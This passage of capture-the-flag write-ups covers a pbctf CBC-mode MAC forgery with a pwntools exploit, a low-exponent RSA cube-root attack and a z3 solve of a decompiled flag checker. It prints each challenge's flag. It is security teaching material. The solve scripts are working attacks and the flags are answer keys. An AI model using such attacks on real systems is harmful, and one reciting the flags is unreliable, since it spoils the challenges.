        assert type(other) == GF

        arr = [0 for _ in range(9)]
        for i in range(5):
            for j in range(5):
                arr[i + j] = (arr[i + j] + self.value[i] * other.value[j]) % 3
        
        # Modulus: x^5 + 2*x + 1
        for i in range(8, 4, -1):
            arr[i - 4] = (arr[i - 4] - 2 * arr[i]) % 3
            arr[i - 5] = (arr[i - 5] - arr[i]) % 3
        
        return GF(arr[:5])
    
    def __pow__(self, other):
        assert type(other) == int
        base, ret = self, GF(1)
        while other > 0:
            if other & 1:
                ret = ret * base
            other >>= 1
            base = base * base
        return ret

    def inverse(self):
        return self ** 241

    def __div__(self, other):
        assert type(other) == GF
        return self * other.inverse()
    
    def to_int(self):
        return sum([self.value[i] * (3 ** i) for i in range(5)])

if __name__ == "__main__":
    assert GF(3) * GF(3) == GF(9)
    assert GF(9) * GF(27) == GF(5)
    assert GF(5).inverse() == GF(240)
```

The key point here is by looking at the way it encrypts and decrypts, we know it's `CBC` mode.

A well-known property of CBC is that adding a block after the plaintext will not affect the ciphertext of the original plaintext.

So we can bypass it by query the encryption of `pad('gimmeflag')` and delete the unwanted part.

exp:
```py
from pwn import *

def get_mac(pt):
    mac = hashlib.sha256(pt).digest()[:9]
    return bytes([x % 243 for x in mac])

def pad(pt):
    mac = get_mac(pt)
    v = 9 - len(pt) % 9
    return pt + bytes([v] * v) + mac

p = remote('blocky-0.chal.perfect.blue',1337)
p.sendline(b'E')
p.recvuntil(b'Input (in hex): ')
p.sendline(pad(b'gimmeflag').hex().encode())
p.recvuntil(b'Result: ')
c = bytes.fromhex(p.recvline().decode().strip())
p.sendline(b'D')
p.recvuntil(b'Input (in hex): ')
p.sendline(c[:36].hex().encode())
p.interactive()

# pbctf{actually_I_made_the_same_mistake_in_CODEGATE_Finals}
```

# 0xL4ugh CTF 23'

## Crypto 2
`code.py`:
```py
from Crypto.Util.number import bytes_to_long, getPrime
from secret import messages


def RSA_encrypt(message):
    m = bytes_to_long(message)
    p = getPrime(1024)
    q = getPrime(1024)
    N = p * q
    e = 3
    c = pow(m, e, N)
    return N, e, c


for m in messages:
    N, e, c = RSA_encrypt(m)
    print(f"n = {N}")
    print(f"e = {e}")
    print(f"c = {c}")
```
`output.txt`:
```
n = 16691865792147194697602300512532851182049374635648801189035809706515463120586646192481229145243032049569188562652509317620313234450062651687702398851985141210252080200118496555573100538082230667123330012596663673730204381449416210246747100065137562877723883087453655498192797717322414163929033958154847172474876805828355467779563924126108244847992313964795565023554963296215243179420547862638306573737884301209065640499511319512400331964327680966267406302192650421152395257843371809022919488155958420254813754963104236903270765037373600427365083337259089056941701762267110792581437924801009323096077817633370816094073
e = 3
c = 527715545190279160683427564102415343921040361668522479441727171363460126920288425567651662947621100428078618585624707291232885706132068328305084115992340337032439274527186826778447854890982475878955397378947713414201050357209397140391734937299379698886378260075489810871914081834819238233619226377140629000968272406078503709732856007314599153696811725183993977424740513321277346005097500256459835713834182894305536107589525724571208098322359262186595358977825573193007799376102473240254372327730839223120373818874006086733633525830272119104666835113980722223258389364156995110666626033474727892354233040278510447646
......

```
Because `e=3` is small, we tried to bruteforce the `m`.
```py
import gmpy2
import libnum
n = 16691865792147194697602300512532851182049374635648801189035809706515463120586646192481229145243032049569188562652509317620313234450062651687702398851985141210252080200118496555573100538082230667123330012596663673730204381449416210246747100065137562877723883087453655498192797717322414163929033958154847172474876805828355467779563924126108244847992313964795565023554963296215243179420547862638306573737884301209065640499511319512400331964327680966267406302192650421152395257843371809022919488155958420254813754963104236903270765037373600427365083337259089056941701762267110792581437924801009323096077817633370816094073
e = 3
c = 527715545190279160683427564102415343921040361668522479441727171363460126920288425567651662947621100428078618585624707291232885706132068328305084115992340337032439274527186826778447854890982475878955397378947713414201050357209397140391734937299379698886378260075489810871914081834819238233619226377140629000968272406078503709732856007314599153696811725183993977424740513321277346005097500256459835713834182894305536107589525724571208098322359262186595358977825573193007799376102473240254372327730839223120373818874006086733633525830272119104666835113980722223258389364156995110666626033474727892354233040278510447646
i = 0
while True:
    res = gmpy2.iroot(c+i*n,3)
    if res[1]:
        print(libnum.n2s(int(res[0])))
        break
    i += 1
# OSC{C0N6r47U14710N5!_Y0U_UND3r574ND_H0W_70_U53_H4574D5_8r04DC457_4774CK_______0xL4ugh}
```
... and we succeed in one attempt. It seems the intented solution was the Hastad's Broadcast Attack.

## Easy-Peasy
source:
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbx
  void **v4; // rdx
  void **v5; // rax
  __int64 v6; // rax
  void **v7; // rdx
  __int64 v8; // rax
  void *v9; // rcx
  int v11[6]; // [rsp+20h] [rbp-50h]
  __int16 v12; // [rsp+38h] [rbp-38h]
  char v13; // [rsp+3Ah] [rbp-36h]
  __int64 v14; // [rsp+40h] [rbp-30h]
  void *Block[2]; // [rsp+48h] [rbp-28h] BYREF
  __int64 v16; // [rsp+58h] [rbp-18h]
  unsigned __int64 v17; // [rsp+60h] [rbp-10h]

  v14 = -2i64;
  v11[0] = 1947518052;
  v11[1] = 84227255;
  v11[2] = -181070859;
  v11[3] = -972881100;
  v11[4] = 1396909045;
  v11[5] = 1396929315;
  v12 = -10397;
  v13 = 0;
  v3 = 0i64;
  v16 = 0i64;
  v17 = 15i64;
  LOBYTE(Block[0]) = 0;
  sub_140001350(Block);
  sub_1400015D0(std::cout, "Enter The Flag: ");
  sub_140001A50(std::cin, Block);
  if ( v16 == 26 )
  {
    while ( 1 )
    {
      v4 = Block;
      if ( v17 >= 0x10 )
        v4 = (void **)Block[0];
      v5 = Block;
      if ( v17 >= 0x10 )
        v5 = (void **)Block[0];
      if ( *((unsigned __int8 *)v11 + v3) != ((*((char *)v4 + v3) >> 4) | (16 * (*((_BYTE *)v5 + v3) & 0xF))) )
        break;
      if ( ++v3 >= 26 )
      {
        v6 = sub_1400015D0(std::cout, "The Flag is: ");
        v7 = Block;
        if ( v17 >= 0x10 )
          v7 = (void **)Block[0];
        sub_140001C50(v6, v7, v16);
        goto LABEL_12;
      }
    }
  }
  v8 = sub_1400015D0(std::cout, "This will not work");
  std::ostream::operator<<(v8, sub_1400017A0);
LABEL_12:
  if ( v17 >= 0x10 )
  {
    v9 = Block[0];
    if ( v17 + 1 >= 0x1000 )
    {
      v9 = (void *)*((_QWORD *)Block[0] - 1);
      if ( (unsigned __int64)(Block[0] - v9 - 8) > 0x1F )
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(v9);
  }
  return 0;
}
```
Solution:

Use `z3-solver` to solve the constraints. Put the data into hex view to better fit it into python.
```py
from z3 import *
c = bytes.fromhex('64 C4 14 74 B7 34 05 05 F5 13 35 F5 34 03 03 C6 F5 23 43 53 23 73 43 53 63 D7')
n = len(c)
m = [BitVec(f'm_{i}',8) for i in range(n)]
s = Solver()
for i in range(n):
	s.add(c[i] == ((m[i] >> 4) | (16 * (m[i] & 0xF))))
if s.check() == sat:
	m = bytes([s.model().eval(m[i]).as_long() for i in range(n)])
	print(m)
else:
	print('unsat')

# FLAG{CPP_1S_C00l_24527456}
```
Finally, remember to change the flag format to `0xL4ugh{}`.

